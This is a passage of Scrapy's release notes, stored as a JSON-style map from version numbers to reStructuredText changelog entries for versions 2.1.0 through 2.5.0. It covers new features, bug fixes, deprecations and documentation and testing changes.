:ref:`HTTP/2 support <http2>` through a new download handler\n    that can be assigned to the ``https`` protocol in the\n    :setting:`DOWNLOAD_HANDLERS` setting.\n    (:issue:`1854`, :issue:`4769`, :issue:`5058`, :issue:`5059`, :issue:`5066`)\n\n-   The new :func:`scrapy.downloadermiddlewares.retry.get_retry_request`\n    function may be used from spider callbacks or middlewares to handle the\n    retrying of a request beyond the scenarios that\n    :class:`~scrapy.downloadermiddlewares.retry.RetryMiddleware` supports.\n    (:issue:`3590`, :issue:`3685`, :issue:`4902`)\n\n-   The new :class:`~scrapy.signals.headers_received` signal gives early access\n    to response headers and allows :ref:`stopping downloads\n    <topics-stop-response-download>`.\n    (:issue:`1772`, :issue:`4897`)\n\n-   The new :attr:`Response.protocol <scrapy.http.Response.protocol>`\n    attribute gives access to the string that identifies the protocol used to\n    download a response. (:issue:`4878`)\n\n-   :ref:`Stats <topics-stats>` now include the following entries that indicate\n    the number of successes and failures in storing\n    :ref:`feeds <topics-feed-exports>`::\n\n        feedexport/success_count/<storage type>\n        feedexport/failed_count/<storage type>\n\n    Where ``<storage type>`` is the feed storage backend class name, such as\n    :class:`~scrapy.extensions.feedexport.FileFeedStorage` or\n    :class:`~scrapy.extensions.feedexport.FTPFeedStorage`.\n\n    (:issue:`3947`, :issue:`4850`)\n\n-   The :class:`~scrapy.spidermiddlewares.urllength.UrlLengthMiddleware` spider\n    middleware now logs ignored URLs with ``INFO`` :ref:`logging level\n    <levels>` instead of ``DEBUG``, and it now includes the following entry\n    into :ref:`stats <topics-stats>` to keep track of the number of ignored\n    URLs::\n\n        urllength/request_ignored_count\n\n    (:issue:`5036`)\n\n-   The\n    :class:`~scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware`\n    downloader middleware now logs the number of decompressed responses and the\n    total count of resulting bytes::\n\n        httpcompression/response_bytes\n        httpcompression/response_count\n\n    (:issue:`4797`, :issue:`4799`)\n\n\nBug fixes\n~~~~~~~~~\n\n-   Fixed installation on PyPy installing PyDispatcher in addition to\n    PyPyDispatcher, which could prevent Scrapy from working depending on which\n    package got imported. (:issue:`4710`, :issue:`4814`)\n\n-   When inspecting a callback to check if it is a generator that also returns\n    a value, an exception is no longer raised if the callback has a docstring\n    with lower indentation than the following code.\n    (:issue:`4477`, :issue:`4935`)\n\n-   The `Content-Length <https://tools.ietf.org/html/rfc2616#section-14.13>`_\n    header is no longer omitted from responses when using the default, HTTP/1.1\n    download handler (see :setting:`DOWNLOAD_HANDLERS`).\n    (:issue:`5009`, :issue:`5034`, :issue:`5045`, :issue:`5057`, :issue:`5062`)\n\n-   Setting the :reqmeta:`handle_httpstatus_all` request meta key to ``False``\n    now has the same effect as not setting it at all, instead of having the\n    same effect as setting it to ``True``.\n    (:issue:`3851`, :issue:`4694`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Added instructions to :ref:`install Scrapy in Windows using pip\n    <intro-install-windows>`.\n    (:issue:`4715`, :issue:`4736`)\n\n-   Logging documentation now includes :ref:`additional ways to filter logs\n    <topics-logging-advanced-customization>`.\n    (:issue:`4216`, :issue:`4257`, :issue:`4965`)\n\n-   Covered how to deal with long lists of allowed domains in the :ref:`FAQ\n    <faq>`. (:issue:`2263`, :issue:`3667`)\n\n-   Covered scrapy-bench_ in :ref:`benchmarking`.\n    (:issue:`4996`, :issue:`5016`)\n\n-   Clarified that one :ref:`extension <topics-extensions>` instance is created\n    per crawler.\n    (:issue:`5014`)\n\n-   Fixed some errors in examples.\n    (:issue:`4829`, :issue:`4830`, :issue:`4907`, :issue:`4909`,\n    :issue:`5008`)\n\n-   Fixed some external links, typos, and so on.\n    (:issue:`4892`, :issue:`4899`, :issue:`4936`, :issue:`4942`, :issue:`5005`,\n    :issue:`5063`)\n\n-   The :ref:`list of Request.meta keys <topics-request-meta>` is now sorted\n    alphabetically.\n    (:issue:`5061`, :issue:`5065`)\n\n-   Updated references to Scrapinghub, which is now called Zyte.\n    (:issue:`4973`, :issue:`5072`)\n\n-   Added a mention to contributors in the README. (:issue:`4956`)\n\n-   Reduced the top margin of lists. (:issue:`4974`)\n\n\nQuality Assurance\n~~~~~~~~~~~~~~~~~\n\n-   Made Python 3.9 support official (:issue:`4757`, :issue:`4759`)\n\n-   Extended typing hints (:issue:`4895`)\n\n-   Fixed deprecated uses of the Twisted API.\n    (:issue:`4940`, :issue:`4950`, :issue:`5073`)\n\n-   Made our tests run with the new pip resolver.\n    (:issue:`4710`, :issue:`4814`)\n\n-   Added tests to ensure that :ref:`coroutine support <coroutine-support>`\n    is tested. (:issue:`4987`)\n\n-   Migrated from Travis CI to GitHub Actions. (:issue:`4924`)\n\n-   Fixed CI issues.\n    (:issue:`4986`, :issue:`5020`, :issue:`5022`, :issue:`5027`, :issue:`5052`,\n    :issue:`5053`)\n\n-   Implemented code refactorings, style fixes and cleanups.\n    (:issue:`4911`, :issue:`4982`, :issue:`5001`, :issue:`5002`, :issue:`5076`)\n\n\n.. _release-2.4.1:\n\n", "2.4.1": "-------------------------\n\n-   Fixed :ref:`feed exports <topics-feed-exports>` overwrite support (:issue:`4845`, :issue:`4857`, :issue:`4859`)\n\n-   Fixed the AsyncIO event loop handling, which could make code hang\n    (:issue:`4855`, :issue:`4872`)\n\n-   Fixed the IPv6-capable DNS resolver\n    :class:`~scrapy.resolver.CachingHostnameResolver` for download handlers\n    that call\n    :meth:`reactor.resolve <twisted.internet.interfaces.IReactorCore.resolve>`\n    (:issue:`4802`, :issue:`4803`)\n\n-   Fixed the output of the :command:`genspider` command showing placeholders\n    instead of the import path of the generated spider module (:issue:`4874`)\n\n-   Migrated Windows CI from Azure Pipelines to GitHub Actions (:issue:`4869`,\n    :issue:`4876`)\n\n\n.. _release-2.4.0:\n\n", "2.4.0": "-------------------------\n\nHighlights:\n\n*   Python 3.5 support has been dropped.\n\n*   The ``file_path`` method of :ref:`media pipelines <topics-media-pipeline>`\n    can now access the source :ref:`item <topics-items>`.\n\n    This allows you to set a download file path based on item data.\n\n*   The new ``item_export_kwargs`` key of the :setting:`FEEDS` setting allows\n    to define keyword parameters to pass to :ref:`item exporter classes\n    <topics-exporters>`\n\n*   You can now choose whether :ref:`feed exports <topics-feed-exports>`\n    overwrite or append to the output file.\n\n    For example, when using the :command:`crawl` or :command:`runspider`\n    commands, you can use the ``-O`` option instead of ``-o`` to overwrite the\n    output file.\n\n*   Zstd-compressed responses are now supported if zstandard_ is installed.\n\n*   In settings, where the import path of a class is required, it is now\n    possible to pass a class object instead.\n\nModified requirements\n~~~~~~~~~~~~~~~~~~~~~\n\n*   Python 3.6 or greater is now required; support for Python 3.5 has been\n    dropped\n\n    As a result:\n\n    -   When using PyPy, PyPy 7.2.0 or greater :ref:`is now required\n        <faq-python-versions>`\n\n    -   For Amazon S3 storage support in :ref:`feed exports\n        <topics-feed-storage-s3>` or :ref:`media pipelines\n        <media-pipelines-s3>`, botocore_ 1.4.87 or greater is now required\n\n    -   To use the :ref:`images pipeline <images-pipeline>`, Pillow_ 4.0.0 or\n        greater is now required\n\n    (:issue:`4718`, :issue:`4732`, :issue:`4733`, :issue:`4742`, :issue:`4743`,\n    :issue:`4764`)\n\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*   :class:`~scrapy.downloadermiddlewares.cookies.CookiesMiddleware` once again\n    discards cookies defined in :attr:`Request.headers\n    <scrapy.http.Request.headers>`.\n\n    We decided to revert this bug fix, introduced in Scrapy 2.2.0, because it\n    was reported that the current implementation could break existing code.\n\n    If you need to set cookies for a request, use the :class:`Request.cookies\n    <scrapy.http.Request>` parameter.\n\n    A future version of Scrapy will include a new, better implementation of the\n    reverted bug fix.\n\n    (:issue:`4717`, :issue:`4823`)\n\n\n.. _2.4-deprecation-removals:\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n*   :class:`scrapy.extensions.feedexport.S3FeedStorage` no longer reads the\n    values of ``access_key`` and ``secret_key`` from the running project\n    settings when they are not passed to its ``__init__`` method; you must\n    either pass those parameters to its ``__init__`` method or use\n    :class:`S3FeedStorage.from_crawler\n    <scrapy.extensions.feedexport.S3FeedStorage.from_crawler>`\n    (:issue:`4356`, :issue:`4411`, :issue:`4688`)\n\n*   :attr:`Rule.process_request <scrapy.spiders.crawl.Rule.process_request>`\n    no longer admits callables which expect a single ``request`` parameter,\n    rather than both ``request`` and ``response`` (:issue:`4818`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n*   In custom :ref:`media pipelines <topics-media-pipeline>`, signatures that\n    do not accept a keyword-only ``item`` parameter in any of the  methods that\n    :ref:`now support this parameter <media-pipeline-item-parameter>` are now\n    deprecated (:issue:`4628`, :issue:`4686`)\n\n*   In custom :ref:`feed storage backend classes <topics-feed-storage>`,\n    ``__init__`` method signatures that do not accept a keyword-only\n    ``feed_options`` parameter are now deprecated (:issue:`547`, :issue:`716`,\n    :issue:`4512`)\n\n*   The :class:`scrapy.utils.python.WeakKeyCache` class is now deprecated\n    (:issue:`4684`, :issue:`4701`)\n\n*   The :func:`scrapy.utils.boto.is_botocore` function is now deprecated, use\n    :func:`scrapy.utils.boto.is_botocore_available` instead (:issue:`4734`,\n    :issue:`4776`)\n\n\nNew features\n~~~~~~~~~~~~\n\n.. _media-pipeline-item-parameter:\n\n*   The following methods of :ref:`media pipelines <topics-media-pipeline>` now\n    accept an ``item`` keyword-only parameter containing the source\n    :ref:`item <topics-items>`:\n\n    -   In :class:`scrapy.pipelines.files.FilesPipeline`:\n\n        -   :meth:`~scrapy.pipelines.files.FilesPipeline.file_downloaded`\n\n        -   :meth:`~scrapy.pipelines.files.FilesPipeline.file_path`\n\n        -   :meth:`~scrapy.pipelines.files.FilesPipeline.media_downloaded`\n\n        -   :meth:`~scrapy.pipelines.files.FilesPipeline.media_to_download`\n\n    -   In :class:`scrapy.pipelines.images.ImagesPipeline`:\n\n        -   :meth:`~scrapy.pipelines.images.ImagesPipeline.file_downloaded`\n\n        -   :meth:`~scrapy.pipelines.images.ImagesPipeline.file_path`\n\n        -   :meth:`~scrapy.pipelines.images.ImagesPipeline.get_images`\n\n        -   :meth:`~scrapy.pipelines.images.ImagesPipeline.image_downloaded`\n\n        -   :meth:`~scrapy.pipelines.images.ImagesPipeline.media_downloaded`\n\n        -   :meth:`~scrapy.pipelines.images.ImagesPipeline.media_to_download`\n\n    (:issue:`4628`, :issue:`4686`)\n\n*   The new ``item_export_kwargs`` key of the :setting:`FEEDS` setting allows\n    to define keyword parameters to pass to :ref:`item exporter classes\n    <topics-exporters>` (:issue:`4606`, :issue:`4768`)\n\n*   :ref:`Feed exports <topics-feed-exports>` gained overwrite support:\n\n    *   When using the :command:`crawl` or :command:`runspider` commands, you\n        can use the ``-O`` option instead of ``-o`` to overwrite the output\n        file\n\n    *   You can use the ``overwrite`` key in the :setting:`FEEDS` setting to\n        configure whether to overwrite the output file (``True``) or append to\n        its content (``False``)\n\n    *   The ``__init__`` and ``from_crawler`` methods of :ref:`feed storage\n        backend classes <topics-feed-storage>` now receive a new keyword-only\n        parameter, ``feed_options``, which is a dictionary of :ref:`feed\n        options <feed-options>`\n\n    (:issue:`547`, :issue:`716`, :issue:`4512`)\n\n*   Zstd-compressed responses are now supported if zstandard_ is installed\n    (:issue:`4831`)\n\n*   In settings, where the import path of a class is required, it is now\n    possible to pass a class object instead (:issue:`3870`, :issue:`3873`).\n\n    This includes also settings where only part of its value is made of an\n    import path, such as :setting:`DOWNLOADER_MIDDLEWARES` or\n    :setting:`DOWNLOAD_HANDLERS`.\n\n*   :ref:`Downloader middlewares <topics-downloader-middleware>` can now\n    override :class:`response.request <scrapy.http.Response.request>`.\n\n    If a :ref:`downloader middleware <topics-downloader-middleware>` returns\n    a :class:`~scrapy.http.Response` object from\n    :meth:`~scrapy.downloadermiddlewares.DownloaderMiddleware.process_response`\n    or\n    :meth:`~scrapy.downloadermiddlewares.DownloaderMiddleware.process_exception`\n    with a custom :class:`~scrapy.http.Request` object assigned to\n    :class:`response.request <scrapy.http.Response.request>`:\n\n    -   The response is handled by the callback of that custom\n        :class:`~scrapy.http.Request` object, instead of being handled by the\n        callback of the original :class:`~scrapy.http.Request` object\n\n    -   That custom :class:`~scrapy.http.Request` object is now sent as the\n        ``request`` argument to the :signal:`response_received` signal, instead\n        of the original :class:`~scrapy.http.Request` object\n\n    (:issue:`4529`, :issue:`4632`)\n\n*   When using the :ref:`FTP feed storage backend <topics-feed-storage-ftp>`:\n\n    -   It is now possible to set the new ``overwrite`` :ref:`feed option\n        <feed-options>` to ``False`` to append to an existing file instead of\n        overwriting it\n\n    -   The FTP password can now be omitted if it is not necessary\n\n    (:issue:`547`, :issue:`716`, :issue:`4512`)\n\n*   The ``__init__`` method of :class:`~scrapy.exporters.CsvItemExporter` now\n    supports an ``errors`` parameter to indicate how to handle encoding errors\n    (:issue:`4755`)\n\n*   When :ref:`using asyncio <using-asyncio>`, it is now possible to\n    :ref:`set a custom asyncio loop <using-custom-loops>` (:issue:`4306`,\n    :issue:`4414`)\n\n*   Serialized requests (see :ref:`topics-jobs`) now support callbacks that are\n    spider methods that delegate on other callable (:issue:`4756`)\n\n*   When a response is larger than :setting:`DOWNLOAD_MAXSIZE`, the logged\n    message is now a warning, instead of an error (:issue:`3874`,\n    :issue:`3886`, :issue:`4752`)\n\n\nBug fixes\n~~~~~~~~~\n\n*   The :command:`genspider` command no longer overwrites existing files\n    unless the ``--force`` option is used (:issue:`4561`, :issue:`4616`,\n    :issue:`4623`)\n\n*   Cookies with an empty value are no longer considered invalid cookies\n    (:issue:`4772`)\n\n*   The :command:`runspider` command now supports files with the ``.pyw`` file\n    extension (:issue:`4643`, :issue:`4646`)\n\n*   The :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware`\n    middleware now simply ignores unsupported proxy values (:issue:`3331`,\n    :issue:`4778`)\n\n*   Checks for generator callbacks with a ``return`` statement no longer warn\n    about ``return`` statements in nested functions (:issue:`4720`,\n    :issue:`4721`)\n\n*   The system file mode creation mask no longer affects the permissions of\n    files generated using the :command:`startproject` command (:issue:`4722`)\n\n*   :func:`scrapy.utils.iterators.xmliter` now supports namespaced node names\n    (:issue:`861`, :issue:`4746`)\n\n*   :class:`~scrapy.Request` objects can now have ``about:`` URLs, which can\n    work when using a headless browser (:issue:`4835`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n*   The :setting:`FEED_URI_PARAMS` setting is now documented (:issue:`4671`,\n    :issue:`4724`)\n\n*   Improved the documentation of\n    :ref:`link extractors <topics-link-extractors>` with an usage example from\n    a spider callback and reference documentation for the\n    :class:`~scrapy.link.Link` class (:issue:`4751`, :issue:`4775`)\n\n*   Clarified the impact of :setting:`CONCURRENT_REQUESTS` when using the\n    :class:`~scrapy.extensions.closespider.CloseSpider` extension\n    (:issue:`4836`)\n\n*   Removed references to Python 2\u2019s ``unicode`` type (:issue:`4547`,\n    :issue:`4703`)\n\n*   We now have an :ref:`official deprecation policy <deprecation-policy>`\n    (:issue:`4705`)\n\n*   Our :ref:`documentation policies <documentation-policies>` now cover usage\n    of Sphinx\u2019s :rst:dir:`versionadded` and :rst:dir:`versionchanged`\n    directives, and we have removed usages referencing Scrapy 1.4.0 and earlier\n    versions (:issue:`3971`, :issue:`4310`)\n\n*   Other documentation cleanups (:issue:`4090`, :issue:`4782`, :issue:`4800`,\n    :issue:`4801`, :issue:`4809`, :issue:`4816`, :issue:`4825`)\n\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n*   Extended typing hints (:issue:`4243`, :issue:`4691`)\n\n*   Added tests for the :command:`check` command (:issue:`4663`)\n\n*   Fixed test failures on Debian (:issue:`4726`, :issue:`4727`, :issue:`4735`)\n\n*   Improved Windows test coverage (:issue:`4723`)\n\n*   Switched to :ref:`formatted string literals <f-strings>` where possible\n    (:issue:`4307`, :issue:`4324`, :issue:`4672`)\n\n*   Modernized :func:`super` usage (:issue:`4707`)\n\n*   Other code and test cleanups (:issue:`1790`, :issue:`3288`, :issue:`4165`,\n    :issue:`4564`, :issue:`4651`, :issue:`4714`, :issue:`4738`, :issue:`4745`,\n    :issue:`4747`, :issue:`4761`, :issue:`4765`, :issue:`4804`, :issue:`4817`,\n    :issue:`4820`, :issue:`4822`, :issue:`4839`)\n\n\n.. _release-2.3.0:\n\n", "2.3.0": "-------------------------\n\nHighlights:\n\n*   :ref:`Feed exports <topics-feed-exports>` now support :ref:`Google Cloud\n    Storage <topics-feed-storage-gcs>` as a storage backend\n\n*   The new :setting:`FEED_EXPORT_BATCH_ITEM_COUNT` setting allows to deliver\n    output items in batches of up to the specified number of items.\n\n    It also serves as a workaround for :ref:`delayed file delivery\n    <delayed-file-delivery>`, which causes Scrapy to only start item delivery\n    after the crawl has finished when using certain storage backends\n    (:ref:`S3 <topics-feed-storage-s3>`, :ref:`FTP <topics-feed-storage-ftp>`,\n    and now :ref:`GCS <topics-feed-storage-gcs>`).\n\n*   The base implementation of :ref:`item loaders <topics-loaders>` has been\n    moved into a separate library, :doc:`itemloaders <itemloaders:index>`,\n    allowing usage from outside Scrapy and a separate release schedule\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n*   Removed the following classes and their parent modules from\n    ``scrapy.linkextractors``:\n\n    *   ``htmlparser.HtmlParserLinkExtractor``\n    *   ``regex.RegexLinkExtractor``\n    *   ``sgml.BaseSgmlLinkExtractor``\n    *   ``sgml.SgmlLinkExtractor``\n\n    Use\n    :class:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    instead (:issue:`4356`, :issue:`4679`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n*   The ``scrapy.utils.python.retry_on_eintr`` function is now deprecated\n    (:issue:`4683`)\n\n\nNew features\n~~~~~~~~~~~~\n\n*   :ref:`Feed exports <topics-feed-exports>` support :ref:`Google Cloud\n    Storage <topics-feed-storage-gcs>` (:issue:`685`, :issue:`3608`)\n\n*   New :setting:`FEED_EXPORT_BATCH_ITEM_COUNT` setting for batch deliveries\n    (:issue:`4250`, :issue:`4434`)\n\n*   The :command:`parse` command now allows specifying an output file\n    (:issue:`4317`, :issue:`4377`)\n\n*   :meth:`Request.from_curl <scrapy.http.Request.from_curl>` and\n    :func:`~scrapy.utils.curl.curl_to_request_kwargs` now also support\n    ``--data-raw`` (:issue:`4612`)\n\n*   A ``parse`` callback may now be used in built-in spider subclasses, such\n    as :class:`~scrapy.spiders.CrawlSpider` (:issue:`712`, :issue:`732`,\n    :issue:`781`, :issue:`4254` )\n\n\nBug fixes\n~~~~~~~~~\n\n*   Fixed the :ref:`CSV exporting <topics-feed-format-csv>` of\n    :ref:`dataclass items <dataclass-items>` and :ref:`attr.s items\n    <attrs-items>` (:issue:`4667`, :issue:`4668`)\n\n*   :meth:`Request.from_curl <scrapy.http.Request.from_curl>` and\n    :func:`~scrapy.utils.curl.curl_to_request_kwargs` now set the request\n    method to ``POST`` when a request body is specified and no request method\n    is specified (:issue:`4612`)\n\n*   The processing of ANSI escape sequences in enabled in Windows 10.0.14393\n    and later, where it is required for colored output (:issue:`4393`,\n    :issue:`4403`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n*   Updated the `OpenSSL cipher list format`_ link in the documentation about\n    the :setting:`DOWNLOADER_CLIENT_TLS_CIPHERS` setting (:issue:`4653`)\n\n*   Simplified the code example in :ref:`topics-loaders-dataclass`\n    (:issue:`4652`)\n\n.. _OpenSSL cipher list format: https://www.openssl.org/docs/manmaster/man1/openssl-ciphers.html#CIPHER-LIST-FORMAT\n\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n*   The base implementation of :ref:`item loaders <topics-loaders>` has been\n    moved into :doc:`itemloaders <itemloaders:index>` (:issue:`4005`,\n    :issue:`4516`)\n\n*   Fixed a silenced error in some scheduler tests (:issue:`4644`,\n    :issue:`4645`)\n\n*   Renewed the localhost certificate used for SSL tests (:issue:`4650`)\n\n*   Removed cookie-handling code specific to Python 2 (:issue:`4682`)\n\n*   Stopped using Python 2 unicode literal syntax (:issue:`4704`)\n\n*   Stopped using a backlash for line continuation (:issue:`4673`)\n\n*   Removed unneeded entries from the MyPy exception list (:issue:`4690`)\n\n*   Automated tests now pass on Windows as part of our continuous integration\n    system (:issue:`4458`)\n\n*   Automated tests now pass on the latest PyPy version for supported Python\n    versions in our continuous integration system (:issue:`4504`)\n\n\n.. _release-2.2.1:\n\n", "2.2.1": "-------------------------\n\n*   The :command:`startproject` command no longer makes unintended changes to\n    the permissions of files in the destination folder, such as removing\n    execution permissions (:issue:`4662`, :issue:`4666`)\n\n\n.. _release-2.2.0:\n\n", "2.2.0": "-------------------------\n\nHighlights:\n\n* Python 3.5.2+ is required now\n* :ref:`dataclass objects <dataclass-items>` and\n  :ref:`attrs objects <attrs-items>` are now valid :ref:`item types\n  <item-types>`\n* New :meth:`TextResponse.json <scrapy.http.TextResponse.json>` method\n* New :signal:`bytes_received` signal that allows canceling response download\n* :class:`~scrapy.downloadermiddlewares.cookies.CookiesMiddleware` fixes\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*   Support for Python 3.5.0 and 3.5.1 has been dropped; Scrapy now refuses to\n    run with a Python version lower than 3.5.2, which introduced\n    :class:`typing.Type` (:issue:`4615`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n*   :meth:`TextResponse.body_as_unicode\n    <scrapy.http.TextResponse.body_as_unicode>` is now deprecated, use\n    :attr:`TextResponse.text <scrapy.http.TextResponse.text>` instead\n    (:issue:`4546`, :issue:`4555`, :issue:`4579`)\n\n*   :class:`scrapy.item.BaseItem` is now deprecated, use\n    :class:`scrapy.item.Item` instead (:issue:`4534`)\n\n\nNew features\n~~~~~~~~~~~~\n\n*   :ref:`dataclass objects <dataclass-items>` and\n    :ref:`attrs objects <attrs-items>` are now valid :ref:`item types\n    <item-types>`, and a new itemadapter_ library makes it easy to\n    write code that :ref:`supports any item type <supporting-item-types>`\n    (:issue:`2749`, :issue:`2807`, :issue:`3761`, :issue:`3881`, :issue:`4642`)\n\n*   A new :meth:`TextResponse.json <scrapy.http.TextResponse.json>` method\n    allows to deserialize JSON responses (:issue:`2444`, :issue:`4460`,\n    :issue:`4574`)\n\n*   A new :signal:`bytes_received` signal allows monitoring response download\n    progress and :ref:`stopping downloads <topics-stop-response-download>`\n    (:issue:`4205`, :issue:`4559`)\n\n*   The dictionaries in the result list of a :ref:`media pipeline\n    <topics-media-pipeline>` now include a new key, ``status``, which indicates\n    if the file was downloaded or, if the file was not downloaded, why it was\n    not downloaded; see :meth:`FilesPipeline.get_media_requests\n    <scrapy.pipelines.files.FilesPipeline.get_media_requests>` for more\n    information (:issue:`2893`, :issue:`4486`)\n\n*   When using :ref:`Google Cloud Storage <media-pipeline-gcs>` for\n    a :ref:`media pipeline <topics-media-pipeline>`, a warning is now logged if\n    the configured credentials do not grant the required permissions\n    (:issue:`4346`, :issue:`4508`)\n\n*   :ref:`Link extractors <topics-link-extractors>` are now serializable,\n    as long as you do not use :ref:`lambdas <lambda>` for parameters; for\n    example, you can now pass link extractors in :attr:`Request.cb_kwargs\n    <scrapy.http.Request.cb_kwargs>` or\n    :attr:`Request.meta <scrapy.http.Request.meta>` when :ref:`persisting\n    scheduled requests <topics-jobs>` (:issue:`4554`)\n\n*   Upgraded the :ref:`pickle protocol <pickle-protocols>` that Scrapy uses\n    from protocol 2 to protocol 4, improving serialization capabilities and\n    performance (:issue:`4135`, :issue:`4541`)\n\n*   :func:`scrapy.utils.misc.create_instance` now raises a :exc:`TypeError`\n    exception if the resulting instance is ``None`` (:issue:`4528`,\n    :issue:`4532`)\n\n.. _itemadapter: https://github.com/scrapy/itemadapter\n\n\nBug fixes\n~~~~~~~~~\n\n*   :class:`~scrapy.downloadermiddlewares.cookies.CookiesMiddleware` no longer\n    discards cookies defined in :attr:`Request.headers\n    <scrapy.http.Request.headers>` (:issue:`1992`, :issue:`2400`)\n\n*   :class:`~scrapy.downloadermiddlewares.cookies.CookiesMiddleware` no longer\n    re-encodes cookies defined as :class:`bytes` in the ``cookies`` parameter\n    of the ``__init__`` method of :class:`~scrapy.http.Request`\n    (:issue:`2400`, :issue:`3575`)\n\n*   When :setting:`FEEDS` defines multiple URIs, :setting:`FEED_STORE_EMPTY` is\n    ``False`` and the crawl yields no items, Scrapy no longer stops feed\n    exports after the first URI (:issue:`4621`, :issue:`4626`)\n\n*   :class:`~scrapy.spiders.Spider` callbacks defined using :doc:`coroutine\n    syntax <topics/coroutines>` no longer need to return an iterable, and may\n    instead return a :class:`~scrapy.http.Request` object, an\n    :ref:`item <topics-items>`, or ``None`` (:issue:`4609`)\n\n*   The :command:`startproject` command now ensures that the generated project\n    folders and files have the right permissions (:issue:`4604`)\n\n*   Fix a :exc:`KeyError` exception being sometimes raised from\n    :class:`scrapy.utils.datatypes.LocalWeakReferencedCache` (:issue:`4597`,\n    :issue:`4599`)\n\n*   When :setting:`FEEDS` defines multiple URIs, log messages about items being\n    stored now contain information from the corresponding feed, instead of\n    always containing information about only one of the feeds (:issue:`4619`,\n    :issue:`4629`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n*   Added a new section about :ref:`accessing cb_kwargs from errbacks\n    <errback-cb_kwargs>` (:issue:`4598`, :issue:`4634`)\n\n*   Covered chompjs_ in :ref:`topics-parsing-javascript` (:issue:`4556`,\n    :issue:`4562`)\n\n*   Removed from :doc:`topics/coroutines` the warning about the API being\n    experimental (:issue:`4511`, :issue:`4513`)\n\n*   Removed references to unsupported versions of :doc:`Twisted\n    <twisted:index>` (:issue:`4533`)\n\n*   Updated the description of the :ref:`screenshot pipeline example\n    <ScreenshotPipeline>`, which now uses :doc:`coroutine syntax\n    <topics/coroutines>` instead of returning a\n    :class:`~twisted.internet.defer.Deferred` (:issue:`4514`, :issue:`4593`)\n\n*   Removed a misleading import line from the\n    :func:`scrapy.utils.log.configure_logging` code example (:issue:`4510`,\n    :issue:`4587`)\n\n*   The display-on-hover behavior of internal documentation references now also\n    covers links to :ref:`commands <topics-commands>`, :attr:`Request.meta\n    <scrapy.http.Request.meta>` keys, :ref:`settings <topics-settings>` and\n    :ref:`signals <topics-signals>` (:issue:`4495`, :issue:`4563`)\n\n*   It is again possible to download the documentation for offline reading\n    (:issue:`4578`, :issue:`4585`)\n\n*   Removed backslashes preceding ``*args`` and ``**kwargs`` in some function\n    and method signatures (:issue:`4592`, :issue:`4596`)\n\n.. _chompjs: https://github.com/Nykakin/chompjs\n\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n*   Adjusted the code base further to our :ref:`style guidelines\n    <coding-style>` (:issue:`4237`, :issue:`4525`, :issue:`4538`,\n    :issue:`4539`, :issue:`4540`, :issue:`4542`, :issue:`4543`, :issue:`4544`,\n    :issue:`4545`, :issue:`4557`, :issue:`4558`, :issue:`4566`, :issue:`4568`,\n    :issue:`4572`)\n\n*   Removed remnants of Python 2 support (:issue:`4550`, :issue:`4553`,\n    :issue:`4568`)\n\n*   Improved code sharing between the :command:`crawl` and :command:`runspider`\n    commands (:issue:`4548`, :issue:`4552`)\n\n*   Replaced ``chain(*iterable)`` with ``chain.from_iterable(iterable)``\n    (:issue:`4635`)\n\n*   You may now run the :mod:`asyncio` tests with Tox on any Python version\n    (:issue:`4521`)\n\n*   Updated test requirements to reflect an incompatibility with pytest 5.4 and\n    5.4.1 (:issue:`4588`)\n\n*   Improved :class:`~scrapy.spiderloader.SpiderLoader` test coverage for\n    scenarios involving duplicate spider names (:issue:`4549`, :issue:`4560`)\n\n*   Configured Travis CI to also run the tests with Python 3.5.2\n    (:issue:`4518`, :issue:`4615`)\n\n*   Added a `Pylint <https://www.pylint.org/>`_ job to Travis CI\n    (:issue:`3727`)\n\n*   Added a `Mypy <http://mypy-lang.org/>`_ job to Travis CI (:issue:`4637`)\n\n*   Made use of set literals in tests (:issue:`4573`)\n\n*   Cleaned up the Travis CI configuration (:issue:`4517`, :issue:`4519`,\n    :issue:`4522`, :issue:`4537`)\n\n\n.. _release-2.1.0:\n\n", "2.1.0": "-------------------------\n\nHighlights:\n\n* New :setting:`FEEDS` setting to export to multiple feeds\n* New :attr:`Response.ip_address <scrapy.http.Response.ip_address>` attribute\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*   :exc:`AssertionError` exceptions triggered by :ref:`assert <assert>`\n    statements have been replaced by new exception types, to support running\n    Python in optimized mode (see :option:`-O`) without changing Scrapy\u2019s\n    behavior in any unexpected ways.\n\n    If you catch an :exc:`AssertionError` exception from Scrapy, update your\n    code to catch the corresponding new exception.\n\n    (:issue:`4440`)\n\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n*   The ``LOG_UNSERIALIZABLE_REQUESTS`` setting is no longer supported, use\n    :setting:`SCHEDULER_DEBUG` instead (:issue:`4385`)\n\n*   The ``REDIRECT_MAX_METAREFRESH_DELAY`` setting is no longer supported, use\n    :setting:`METAREFRESH_MAXDELAY` instead (:issue:`4385`)\n\n*   The :class:`~scrapy.downloadermiddlewares.chunked.ChunkedTransferMiddleware`\n    middleware has been removed, including the entire\n    :class:`scrapy.downloadermiddlewares.chunked` module; chunked transfers\n    work out of the box (:issue:`4431`)\n\n*   The ``spiders`` property has been removed from\n    :class:`~scrapy.crawler.Crawler`, use :class:`CrawlerRunner.spider_loader\n    <scrapy.crawler.CrawlerRunner.spider_loader>` or instantiate\n    :setting:`SPIDER_LOADER_CLASS` with your settings instead (:issue:`4398`)\n\n*   The ``MultiValueDict``, ``MultiValueDictKeyError``, and ``SiteNode``\n    classes have been removed from :mod:`scrapy.utils.datatypes`\n    